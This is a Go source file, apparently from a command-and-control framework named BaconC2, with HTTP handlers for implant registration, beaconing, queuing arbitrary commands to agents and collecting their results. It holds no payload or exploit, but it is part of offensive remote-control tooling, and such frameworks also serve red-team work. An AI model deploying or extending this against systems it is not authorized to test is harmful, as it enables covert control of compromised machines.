package api

import (
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
	"github.com/RabbITCybErSeC/BaconC2/server/db"
	local_models "github.com/RabbITCybErSeC/BaconC2/server/models"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

// AgentHandler handles agent-related operations
type AgentHandler struct {
	agentRepository db.IAgentRepository
	commandQueue    queue.IServerCommandQueue
	engine          *gin.Engine
}

// NewAgentHandler initializes a new AgentHandler
func NewAgentHandler(agentRepository db.IAgentRepository, commandQueue queue.IServerCommandQueue, engine *gin.Engine) *AgentHandler {
	return &AgentHandler{
		agentRepository: agentRepository,
		commandQueue:    commandQueue,
		engine:          engine,
	}
}

// GinEngine returns the Gin engine
func (h *AgentHandler) GinEngine() *gin.Engine {
	return h.engine
}

// handleRegister handles agent registration
func (h *AgentHandler) handleRegister(c *gin.Context) {
	var agent local_models.ServerAgentModel
	var incomingAgent models.Agent

	if err := c.ShouldBindJSON(&incomingAgent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agent.Agent = incomingAgent
	agent.Protocol = "http"
	agent.LastSeen = time.Now()
	agent.IsActive = true
	agent.Commands = []local_models.AgentCommand{}
	if err := h.agentRepository.Save(&agent); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"status": "registered"})
}

// handleBeacon handles agent beaconing
func (h *AgentHandler) handleBeacon(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentRepository.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	commands, err := h.agentRepository.GetCommandsByStatus(agentID, models.StatusPending)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if len(commands) > 0 {
		cmd := commands[0]

		if err := h.agentRepository.UpdateCommandStatus(cmd.ID, models.CommandStatusSentToClient); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"command":    cmd.Command,
			"nextBeacon": 10,
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status":     "acknowledged",
		"nextBeacon": 10,
	})
}

// handleCommandResult handles command results from agents
func (h *AgentHandler) handleCommandResult(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	var result local_models.AgentCommand
	if err := c.ShouldBindJSON(&result); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	_, err := h.agentRepository.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	result.AgentID = agentID
	result.Command.Status = "completed"
	if err := h.agentRepository.AddCommand(&result); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "received"})
}

// handleAddCommand handles adding a new command for an agent
func (h *AgentHandler) handleAddCommand(c *gin.Context) {
	var rawCmd models.RawCommand
	if err := c.ShouldBindJSON(&rawCmd); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON format: " + err.Error()})
		return
	}
	if rawCmd.Command == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Command field is required and cannot be empty"})
		return
	}

	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentRepository.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	agentCmd := local_models.AgentCommand{
		AgentID: agentID,
		Command: models.Command{
			ID:      uuid.New().String(),
			Command: rawCmd.Command,
			Status:  models.StatusPending,
		},
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}

	if err := h.agentRepository.AddCommand(&agentCmd); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "queued", "id": agentCmd.ID})
}
